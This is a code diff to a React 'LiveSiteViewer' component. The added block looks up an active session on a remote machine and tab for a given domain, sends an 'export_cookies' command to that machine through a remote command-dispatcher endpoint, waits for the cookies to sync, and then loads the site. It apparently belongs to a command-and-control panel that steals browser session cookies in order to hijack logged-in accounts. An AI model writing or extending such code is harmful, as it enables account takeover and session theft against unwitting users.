@@ -302,6 +302,52 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
       return;
     }
 
+    // Try to export fresh cookies if there's an active session
+    try {
+      const { data: sessions } = await supabase
+        .from('active_sessions')
+        .select('machine_id, tab_id')
+        .eq('domain', incident.host)
+        .eq('is_active', true)
+        .order('last_activity', { ascending: false })
+        .limit(1);
+      
+      if (sessions && sessions.length > 0) {
+        const session = sessions[0];
+        console.log('Active session found, requesting fresh cookies...');
+        
+        // Get incident_id from incidents table
+        const { data: incidentData } = await supabase
+          .from('incidents')
+          .select('incident_id')
+          .eq('id', incident.id)
+          .single();
+        
+        if (incidentData?.incident_id) {
+          // Send export_cookies command
+          await fetch(`https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/command-dispatcher`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              command_type: 'export_cookies',
+              target_machine_id: session.machine_id,
+              target_tab_id: session.tab_id,
+              payload: {
+                incident_id: incidentData.incident_id
+              }
+            })
+          });
+          
+          // Wait for cookies to sync
+          await new Promise(resolve => setTimeout(resolve, 2000));
+          console.log('Fresh cookies requested, loading site...');
+        }
+      }
+    } catch (error) {
+      console.error('Failed to export fresh cookies:', error);
+      // Continue with existing cookies
+    }
+
     await handleNavigation(incident.tab_url);
   };
 
